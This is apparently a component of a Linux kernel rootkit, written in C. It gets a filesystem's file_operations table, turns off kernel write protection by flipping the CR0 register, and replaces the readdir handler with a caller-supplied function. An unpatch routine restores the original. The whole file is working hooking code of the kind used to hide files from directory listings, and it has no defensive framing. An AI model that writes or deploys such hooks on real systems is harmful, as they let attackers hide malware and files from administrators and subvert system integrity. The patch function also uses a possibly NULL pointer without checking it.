#include "utils.h"
#include "vfs.h"


struct file_operations *get_vfs_fops(const char *path)
{
    struct file *filp;
    struct file_operations *fs_fops;

    //get file_operations of path
    filp = filp_open(path, O_RDONLY|O_DIRECTORY, 0);
    if (IS_ERR(filp)) {
        dbgprint("fail to open %s for VFS patching\n", path);
        return NULL;
    }
    // discard const from fp->f_op(struct file_operations), can be also made by modifying /include/linux/fs.h 
    fs_fops = (struct file_operations *) filp->f_op;
    filp_close(filp, NULL);
    
    dbgprint("successfully opened %s for VFS patching, fs_ops addr: 0x%p\n", path, fs_fops);

    return fs_fops;

}

int patch_vfs_readdir(const char *path, readdir_t *fs_orig_readdir, readdir_t fs_new_readdir)
{
    struct file_operations *fs_fops;
    
    fs_fops = get_vfs_fops(path);

    //substitute readdir of fs on which path is
    *fs_orig_readdir = fs_fops->readdir;

    //set_addr_rw(fs_fops);
    set_cr0_rw();
    fs_fops->readdir = fs_new_readdir;
    //set_addr_ro(fs_fops);
    set_cr0_ro();

    dbgprint("%s VFS readdir patched\n", path);

    return 1;
}

int unpatch_vfs_readdir(const char *path, readdir_t fs_orig_readdir)
{
    struct file_operations *fs_fops;
    
    fs_fops = get_vfs_fops(path);

    // replace with original
    //set_addr_rw(fs_fops);
    set_cr0_rw();
    fs_fops->readdir = fs_orig_readdir;
    //set_addr_ro(fs_fops);
    set_cr0_ro();
    
    dbgprint("%s VFS readdir unpatched\n", path);

    return 1;
}


